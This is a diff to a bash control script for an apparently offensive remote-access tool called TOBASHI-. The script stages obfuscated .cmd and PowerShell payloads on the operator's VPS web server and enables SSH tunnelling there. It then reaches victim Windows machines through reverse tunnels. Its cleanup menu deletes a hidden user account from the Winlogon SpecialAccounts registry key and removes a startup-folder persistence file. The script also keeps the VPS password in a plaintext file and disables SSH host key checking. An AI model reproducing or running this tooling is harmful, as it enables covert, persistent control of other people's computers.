@@ -150,7 +150,16 @@ choose_user(){
             temp_file=$(tail -n 5 "./users/vps/$user_file" | head -n 1 | tr -d '\r')
 
 
+            ip_vps=$(sed -n '1p' ./bin/login.txt)
+            username_vps=$(sed -n '2p' ./bin/login.txt)
+            password_vps=$(sed -n '3p' ./bin/login.txt)
+
+            # Sauvegarde de la valeur du port actuel
+        #current_port=$(sshpass -p "$password_vps" ssh -t "$username@$ip_remote_vps" "grep '^#Port' /etc/ssh/sshd_config | awk '{print \$2}'")
+        # Remplacement de la valeur du port par $remote_port dans le fichier sshd_config
+        #sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's/^Port 2222$/Port $remote_port/' /etc/ssh/sshd_config"
         
+        #sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/#remote port/{n;s/.*/Port $remote_port/}' /etc/ssh/sshd_config"
         else
             echo "The file $user_file does not exist."
         fi
@@ -197,8 +206,6 @@ console_menu(){
 
     if [ "$connection_type" = "local" ]; then
 
-    
-
         read -p "Tape Enter to go to the LOCAL console..." enter
 
         ssh -t "$username@$ip" # le -t permet d'initier la connexion et de sortir que si on met exit
@@ -206,9 +213,15 @@ console_menu(){
 
     elif [ "$connection_type" = "remote" ]; then
 
+        
+
         read -p "Tape Enter to go to the REMOTE console..." enter
 
-        sshpass -p "$password" ssh -tt "$username@$ip_remote_vps" -p "$remote_port"
+        # Connexion SSH avec le nouveau port
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no -tt "$username@$ip_remote_vps" -p "$remote_port"
+
+        # Restauration de la valeur du port initial après la connexion
+        #sshpass -p "$password_vps" sudo ssh -t "$username@$ip_remote_vps" "sudo sed -i 's/^Port .*/Port $current_port/' /etc/ssh/sshd_config"
 
         read -p "Tape Enter to exit the console..." dummy
     else
@@ -223,10 +236,9 @@ console_menu(){
 #### console_menu --------------------------------------------------
 
 
-
 #### kill_menu-----------------------------------------------
 
-kill_menu(){ #TODO : delete the Guest registery key
+kill_menu(){ #TODO : delete the Guest registry key
     clear
 
     echo -e "${gras}"
@@ -250,17 +262,18 @@ kill_menu(){ #TODO : delete the Guest registery key
 
             registryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
             valueName="$username"
-            
+
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" 'powershell -Command "Set-Service -Name sshd -StartupType 'Manual' " '
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-ItemProperty -Path '$registryPath' -Name '$valueName'\""
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-Item -path '$temp_file\key'\""
             sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-Item -path '$startup_file'\""
-            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-LocalUser -name '$valueName'\"" 
+            sshpass -p "$password" ssh "$username@$ip_remote_vps" -p "$remote_port" "powershell -Command \"Remove-LocalUser -name '$valueName'\""
+            
+            
             rm ./users/vps/$user_file
 
         else
             echo "No user choosed... Go to your user library !"
-
         fi
 
     elif [ "$choice_kill" = "n" ]; then
@@ -268,13 +281,13 @@ kill_menu(){ #TODO : delete the Guest registery key
         echo ""
 
     else
-
         echo "[+] Invalid option !....."
         echo ""
     fi
 
     read -p "Press Enter to continue..." kill_1
 }
+
 
 
 #### kill_menu-----------------------------------------------
@@ -382,6 +395,10 @@ vps_menu(){
     read -p "[+] Please write your VPS username :" username_vps
     read -p "[+] Please write your VPS password :" password_vps
 
+    sed -i "1s/.*/$ip_vps/" ./bin/login.txt
+    sed -i "2s/.*/$username_vps/" ./bin/login.txt
+    sed -i "3s/.*/$password_vps/" ./bin/login.txt
+
     sed -i "s/set \"kdujhfguyU=X.X.X.X\"/set \"kdujhfguyU=$ip_vps\"/" ./src/initial_vps.cmd
 
     sed -i "s/set \"EcSjRhAguo=X.X.X.X\"/set \"EcSjRhAguo=$ip_vps\"/" "./files/stage1_v.cmd"
@@ -395,12 +412,17 @@ vps_menu(){
     echo "" >> ./files/stage1_v.cmd
     echo "" >> ./files/stage2_v.ps1
 
+    #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "sudo apt install -y git openssh-server apache2"
+    repo_url="https://github.com/flamendO/TOBASHI-.git"
 
+
+    
     # INSTALLATION SUR LE VPS DES BONS FICHIERS
 
     # Commande pour cloner le référentiel git dans /var/www/html/TOBASHI- si le dossier n'existe pas
-    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" '[ -d /var/www/html/TOBASHI- ] || sudo git clone https://github.com/flamendO/TOBASHI-.git /var/www/html/TOBASHI-'
+    sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "bash -c '[ -d /var/www/html/TOBASHI- ] || sudo git clone \"$repo_url\" /var/www/html/TOBASHI-'"
 
+    read -p "[+] Click Enter to continue............."
     # Commande pour remplacer le fichier initial_vps.cmd dans TOBASHI-
     sshpass -p "$password_vps" scp ./src/initial_vps.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/src/initial_vps.cmd
 
@@ -410,8 +432,10 @@ vps_menu(){
     # Commande pour remplacer le fichier stage2_v.ps1 dans TOBASHI-/files/
     sshpass -p "$password_vps" scp ./files/stage2_v.ps1 "$username_vps@$ip_vps":/var/www/html/TOBASHI-/files/stage2_v.ps1
     
+    #Remplacer le fichier de ports_list
+    sshpass -p "$password_vps" scp ./bin/ports_list.txt "$username_vps@$ip_vps":/var/www/html/TOBASHI-/bin/ports_list.txt
     
-    
+    sshpass -p "$password_vps" scp ./remove_port.sh "$username_vps@$ip_vps":/var/www/html/TOBASHI-/remove_port.sh
 
     clear
     echo -e "${gras} ${red}"
@@ -459,8 +483,8 @@ vps_menu(){
 
     sshpass -p "$password_vps" scp -r key $username_vps@$ip_vps:/var/www/html/TOBASHI-/
     sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'chmod +r /var/www/html/TOBASHI-/key'
-    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's|DocumentRoot /var/www/html/|DocumentRoot /var/www/html/TOBASHI-/|' /etc/apache2/sites-available/000-default.conf"
-    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's|Directory /var/www/html/|Directory /var/www/html/TOBASHI-/|' /etc/apache2/sites-available/000-default.conf"
+    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sed -i 's|DocumentRoot /var/www/html|DocumentRoot /var/www/html/TOBASHI-|' /etc/apache2/sites-available/000-default.conf"
+    sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'if grep -q "^Directory /var/www/html/$" /etc/apache2/sites-available/000-default.conf; then sed -i "s|^Directory /var/www/html$|<Directory /var/www/html/TOBASHI-/>\n</Directory>|g" /etc/apache2/sites-available/000-default.conf; else sed -i "/^<VirtualHost \*:80>/a <Directory /var/www/html/TOBASHI-/>\n</Directory>" /etc/apache2/sites-available/000-default.conf; fi'
     sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'systemctl restart apache2'
 
     # create config vps file
@@ -477,6 +501,10 @@ vps_menu(){
     sshpass -p "$password_vps" scp ./payloads_generated/initial_vps.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_vps.cmd
     sshpass -p "$password_vps" scp ./payloads_generated/initial_local.cmd "$username_vps@$ip_vps":/var/www/html/TOBASHI-/payloads_generated/initial_local.cmd
     
+    #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "sudo sed -i '/^#Port 22$/s/^#Port 22$/Port 22/; /^Port 22$/a #remote port\n' /etc/ssh/sshd_config"
+
+
+
     echo "[+] Copying payloads to VPS..."
     sleep 2
 
@@ -517,7 +545,7 @@ discord_menu(){
     sleep 1
     python ./src/discord.py 
 
-    clear
+    
     echo "Discord server has been added..."
     cp ./src/initial_local.cmd ./payloads_generated/initial_local.cmd
     sed -i '1s/.*/1/' ./bin/state_machine.txt
@@ -579,16 +607,39 @@ reset_menu(){
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's/AllowTcpForwarding yes/#AllowTcpForwarding no/' /etc/ssh/sshd_config"
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo sed -i "/GatewayPorts yes/d" /etc/ssh/sshd_config'
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'service apache2 stop'
-            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|<Directory /var/www/html/TOBASHI-/>|<Directory /var/www/html/>|' /etc/apache2/sites-available/000-default.conf"
-            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-/|DocumentRoot /var/www/html/|' /etc/apache2/sites-available/000-default.conf"
+            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/<Directory \/var\/www\/html\/TOBASHI-\/>/,/<\/Directory>/d' /etc/apache2/sites-available/000-default.conf"
+            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-|DocumentRoot /var/www/html|' /etc/apache2/sites-available/000-default.conf"
 
             cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd
             cp ./bin/stage1_v_save.cmd ./files/stage1_v.cmd
             cp ./bin/stage2_v_save.ps1 ./files/stage2_v.ps1
+            cp ./bin/ports_list_save.txt ./bin/ports_list.txt
             rm ./key ./key.pub
             rm ./vps_settings/vps_conf.txt
             cp ./bin/initial_vps_save.cmd ./payloads_generated/initial_vps.cmd
             sed -i '2s/.*/0/' ./bin/state_machine.txt
+
+            sed -i "1s/.*/ip_vps/" ./bin/login.txt
+            sed -i "2s/.*/username_vps/" ./bin/login.txt
+            sed -i "3s/.*/password_vps/" ./bin/login.txt
+
+            #sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/#remote port/{n;s/.*/ /}' /etc/ssh/sshd_config"
+
+            #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "
+            #sudo sed -i '/^Port 22$/ {
+            #s/^Port 22$/#Port 22/
+            #:a
+            #n
+            #/^#remote port$/ {
+            #    d
+            #    b
+            #}
+            #ba
+            #}' /etc/ssh/sshd_config"
+
+            #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "sed -i '/^#Port 22$/{n; d;}' /etc/ssh/sshd_config"
+
+
             clear
             echo -e "${gras} ${red}"
             echo "[+] Options are reset !"
@@ -620,12 +671,13 @@ reset_menu(){
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's/AllowTcpForwarding yes/#AllowTcpForwarding no/' /etc/ssh/sshd_config"
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'sudo sed -i "/GatewayPorts yes/d" /etc/ssh/sshd_config'
             sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" 'service apache2 stop'
-            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|<Directory /var/www/html/TOBASHI-/>|<Directory /var/www/html/>|' /etc/apache2/sites-available/000-default.conf"
-            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-/|DocumentRoot /var/www/html/|' /etc/apache2/sites-available/000-default.conf"
+            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/<Directory \/var\/www\/html\/TOBASHI-\/>/,/<\/Directory>/d' /etc/apache2/sites-available/000-default.conf"
+            sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i 's|DocumentRoot /var/www/html/TOBASHI-|DocumentRoot /var/www/html|' /etc/apache2/sites-available/000-default.conf"
 
             cp ./bin/initial_vps_save.cmd ./src/initial_vps.cmd
             cp ./bin/stage1_v_save.cmd ./files/stage1_v.cmd
             cp ./bin/stage2_v_save.ps1 ./files/stage2_v.ps1
+            cp ./bin/ports_list_save.txt ./bin/ports_list.txt
             rm ./key ./key.pub
             rm ./vps_settings/vps_conf.txt
 
@@ -636,6 +688,31 @@ reset_menu(){
             echo -e "${gras} ${red}"
             sed -i '1s/.*/0/' ./bin/state_machine.txt
             sed -i '2s/.*/0/' ./bin/state_machine.txt
+
+
+            sed -i "1s/.*/ip_vps/" ./bin/login.txt
+            sed -i "2s/.*/username_vps/" ./bin/login.txt
+            sed -i "3s/.*/password_vps/" ./bin/login.txt
+
+            #sshpass -p "$password_vps" ssh "$username_vps@$ip_vps" "sudo sed -i '/#remote port/{n;s/.*/ /}' /etc/ssh/sshd_config"
+            #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "
+            #sudo sed -i '/^Port 22$/ {
+            #s/^Port 22$/#Port 22/
+            #:a
+            #n
+            #/^#remote port$/ {
+            #    d
+            #    b
+            #}
+            #ba
+            #}' /etc/ssh/sshd_config"
+
+            #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "sed -i '/^#Port 22$/{n; d;}' /etc/ssh/sshd_config"
+
+            #sshpass -p "$password_vps" ssh -o StrictHostKeyChecking=no "$username_vps@$ip_vps" "sudo sed -i '/#remote port/d' /etc/ssh/sshd_config"
+
+
+
             echo "[+] Options are reset !"
             echo -e "${reset}"
             sleep 2
